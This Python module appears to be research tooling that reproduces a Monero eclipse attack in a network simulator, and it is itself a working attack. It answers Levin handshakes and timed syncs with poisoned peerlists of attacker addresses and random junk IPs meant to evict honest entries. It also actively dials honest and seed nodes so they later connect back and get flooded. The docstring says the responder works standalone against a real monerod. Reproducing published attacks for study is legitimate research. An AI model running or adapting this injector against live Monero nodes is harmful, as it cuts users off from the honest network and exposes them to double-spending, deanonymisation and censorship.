"""Monero peer-record injector (py-levin-style) for the eclipse reproduction.

A Levin *responder*: when a monerod dials this node, it replies to
COMMAND_HANDSHAKE / COMMAND_TIMED_SYNC with a poisoned `local_peerlist_new`
containing attacker-controlled ⟨IP,port⟩ records (the attacker LISTENER nodes,
plus optional trash). In Monero, peer records flow responder→initiator, so a
single reachable injector floods the graylist of every node that dials it —
letting a *minority* attacker dominate peerlists (the paper's N-I/N-II) rather
than needing a majority of real nodes.

The wire codec is in levin_lib. This module has the responder loop (usable
standalone against a real monerod for fast testing) and a monerosim BaseAgent
wrapper (main()) that discovers the attacker listener set from the registry.
"""
import os
import random
import socket
import struct
import threading
import time

from agents import levin_lib as L


class InjectorConfig:
    def __init__(self, network_id, peer_id, my_port, records_fn,
                 height=1, cumdiff=1, top_id=b"\x00" * 32, top_version=1,
                 max_records=250, logger=None, ping_peer_id=None,
                 support_flags=1):
        self.network_id = network_id
        self.peer_id = peer_id
        self.my_port = my_port
        self.records_fn = records_fn  # () -> list of (ip_str, port)
        self.height = height
        self.cumdiff = cumdiff
        self.top_id = top_id
        self.top_version = top_version
        self.max_records = max_records
        self.logger = logger
        # ping_peer_id: the id returned in a PING response. None -> use peer_id
        # (a normal node answers PING with the same id it gave at handshake).
        # Setting it to a DIFFERENT value reproduces the documented spy/proxy
        # fingerprint where the handshake and ping ids disagree (ProbeLab 2026):
        # a front-end that routes the ping to a different backend, or mints a
        # fresh id. Off by default so eclipse tooling is unchanged.
        self.ping_peer_id = ping_peer_id
        # support_flags returned to a REQUEST_SUPPORT_FLAGS (1 = FLUFFY_BLOCKS,
        # as stock monerod). 0 reproduces the flag-omission fingerprint (S4/S6).
        self.support_flags = support_flags
        self.injected = 0
        self.conns = 0

    def log(self, *a):
        if self.logger:
            self.logger.info(*a)


def _peerlist_arr(cfg):
    recs = cfg.records_fn() or []
    random.shuffle(recs)
    recs = recs[: cfg.max_records]
    now = int(time.time())
    entries = [L.peerlist_entry(ip, port, peer_id=random.getrandbits(64),
                                last_seen=now) for ip, port in recs]
    return ("arr_obj", entries)


def _node_data(cfg):
    return L.basic_node_data(cfg.network_id, cfg.my_port, cfg.peer_id)


def _sync_data(cfg):
    return L.core_sync_data(cfg.height, cfg.cumdiff, cfg.top_id, cfg.top_version)


def _send(sock, command, section, return_code=1):
    payload = L.serialize(section)
    sock.sendall(L.pack_header(command, len(payload), L.LEVIN_PACKET_RESPONSE,
                               return_code=return_code, expect_response=False))
    sock.sendall(payload)


def handle_connection(sock, cfg):
    cfg.conns += 1
    try:
        while True:
            command, flags, rc, expect_resp, payload = L.read_bucket(sock)
            is_request = bool(flags & L.LEVIN_PACKET_REQUEST) or expect_resp
            if not is_request:
                continue  # one-way notification (cryptonote NOTIFY_*): ignore
            if command == L.COMMAND_HANDSHAKE:
                arr = _peerlist_arr(cfg)
                _send(sock, command, {
                    "node_data": _node_data(cfg),
                    "payload_data": _sync_data(cfg),
                    "local_peerlist_new": arr,
                })
                cfg.injected += len(arr[1])
                cfg.log("handshake from peer -> injected %d records", len(arr[1]))
            elif command == L.COMMAND_TIMED_SYNC:
                arr = _peerlist_arr(cfg)
                _send(sock, command, {
                    "payload_data": _sync_data(cfg),
                    "local_peerlist_new": arr,
                })
                cfg.injected += len(arr[1])
            elif command == L.COMMAND_PING:
                ping_id = cfg.ping_peer_id if cfg.ping_peer_id is not None else cfg.peer_id
                _send(sock, command, {
                    "status": ("str", L.PING_OK_RESPONSE_STATUS_TEXT),
                    "peer_id": ("u64", ping_id),
                })
            elif command == L.COMMAND_REQUEST_SUPPORT_FLAGS:
                _send(sock, command, {"support_flags": ("u32", cfg.support_flags)})
            else:
                # unknown admin command that expects a response: reply empty OK
                if expect_resp:
                    _send(sock, command, {})
    except (ConnectionError, OSError, ValueError, struct.error):
        pass
    finally:
        try:
            sock.close()
        except OSError:
            pass


def serve_forever(listen_ip, listen_port, cfg, stop_flag=None):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((listen_ip, listen_port))
    srv.listen(128)
    srv.settimeout(1.0)
    cfg.log("injector listening on %s:%d", listen_ip, listen_port)
    while stop_flag is None or not stop_flag.is_set():
        try:
            conn, _addr = srv.accept()
        except socket.timeout:
            continue
        except OSError:
            break
        conn.settimeout(120)
        threading.Thread(target=handle_connection, args=(conn, cfg), daemon=True).start()
    srv.close()


# ---- optional active dialer: insert ourselves into a node's whitelist -----
def dial_and_handshake(target_ip, target_port, cfg, timeout=15):
    """Act as INITIATOR: handshake a reachable node so it PINGs us back and adds
    us to its whitelist -> it will later dial us and get flooded. We send a
    normal handshake request (no peerlist) advertising our my_port."""
    s = L.connect(target_ip, target_port, timeout=timeout)
    try:
        req = L.serialize({
            "node_data": _node_data(cfg),
            "payload_data": _sync_data(cfg),
        })
        s.sendall(L.pack_header(L.COMMAND_HANDSHAKE, len(req), L.LEVIN_PACKET_REQUEST,
                                expect_response=True))
        s.sendall(req)
        # read the response (their peerlist); we don't need it, just drain one bucket
        L.read_bucket(s)
        return True
    except (ConnectionError, OSError, ValueError, struct.error):
        return False
    finally:
        try:
            s.close()
        except OSError:
            pass


# ---- monerosim BaseAgent wrapper ----------------------------------------
def main():
    from agents.base_agent import BaseAgent
    from agents.agent_discovery import AgentDiscovery

    parser = BaseAgent.create_argument_parser("Monero peer-record injector")
    parser.add_argument("--listen_port", "--listen-port", dest="listen_port",
                        type=int, default=18080)
    parser.add_argument("--dial_interval", "--dial-interval", dest="dial_interval",
                        type=int, default=30)
    parser.add_argument("--trash_count", "--trash-count", dest="trash_count",
                        type=int, default=234)
    args, _unknown = parser.parse_known_args()

    class InjectorAgent(BaseAgent):
        def _setup_agent(self):
            self._discovery = AgentDiscovery(str(self.shared_dir) if self.shared_dir else None)
            # script agents don't receive --rpc-host, so bind all interfaces so
            # other nodes can dial us on our Shadow IP:18080.
            self._listen_ip = "0.0.0.0"
            self._listen_port = args.listen_port
            self._stop = threading.Event()
            self._cfg = InjectorConfig(
                network_id=L.NETWORK_ID_MAINNET,
                peer_id=random.getrandbits(64),
                my_port=self._listen_port,
                records_fn=self._attacker_records,
                logger=self.logger,
            )
            t = threading.Thread(target=serve_forever,
                                 args=(self._listen_ip, self._listen_port, self._cfg, self._stop),
                                 daemon=True)
            t.start()
            self.logger.info("InjectorAgent serving on %s:%d", self._listen_ip, self._listen_port)

        def _attacker_records(self):
            """Real attacker LISTENER records (the connection endpoints the target
            will dial) + trash to overflow/evict benign records from graylists
            (the paper's graylist-FIFO eviction). Listeners are stable real
            monerod nodes; trash are unreachable ⟨IP,port⟩ that never become
            successful outbound connections but push benign entries out."""
            recs = []
            try:
                reg = self._discovery.get_agent_registry(force_refresh=True)
                agents = reg.get("agents", [])
                if isinstance(agents, dict):
                    agents = list(agents.values())
                for a in agents:
                    if (a.get("attributes") or {}).get("eclipse_role") == "attacker":
                        ip = a.get("ip_addr")
                        if ip:
                            recs.append((ip, self._listen_port))
            except Exception:  # noqa: BLE001
                pass
            # trash: random public-ish IPs across many distinct /24s
            for _ in range(max(0, args.trash_count)):
                recs.append(("%d.%d.%d.%d" % (random.randint(11, 223),
                                              random.randint(0, 255),
                                              random.randint(0, 255),
                                              random.randint(2, 254)),
                             random.randint(1025, 65000)))
            return recs

        def _reachable_nodes(self):
            """Targets for active whitelist poisoning (paper's N-I): the honest
            reachable population (benign) AND the seed nodes (the paper points
            all attacker IPs at the seeds so they become 'propaganda pipes' for
            every node that bootstraps off them). Attacker nodes are SKIPPED --
            no value in poisoning our own fleet, and skipping ~1,000 of them
            keeps each dial cycle short so poisoning stays ahead of the benign
            population's ~60s re-advertise."""
            out = []
            try:
                reg = self._discovery.get_agent_registry(force_refresh=True)
                agents = reg.get("agents", [])
                if isinstance(agents, dict):
                    agents = list(agents.values())
                for a in agents:
                    role = (a.get("attributes") or {}).get("eclipse_role")
                    aid = a.get("id", "") or ""
                    is_seed = aid.startswith("monero-seed")
                    if (role == "benign" or is_seed) and a.get("ip_addr"):
                        out.append(a["ip_addr"])
            except Exception:  # noqa: BLE001
                pass
            return out

        def run_iteration(self):
            # Actively dial reachable nodes so they whitelist us and later dial
            # us back (then serve_forever floods them). Cheap and idempotent.
            dialed = 0
            for ip in self._reachable_nodes():
                if dial_and_handshake(ip, self._listen_port, self._cfg, timeout=8):
                    dialed += 1
            self.logger.info("injector: dialed %d reachable nodes; total injected=%d conns=%d",
                             dialed, self._cfg.injected, self._cfg.conns)
            return args.dial_interval

    agent = InjectorAgent(
        agent_id=args.id, shared_dir=args.shared_dir,
        daemon_rpc_port=args.daemon_rpc_port, wallet_rpc_port=args.wallet_rpc_port,
        p2p_port=args.p2p_port, rpc_host=args.rpc_host, log_level=args.log_level,
        attributes=args.attributes,
    )
    agent.run()


if __name__ == "__main__":
    main()
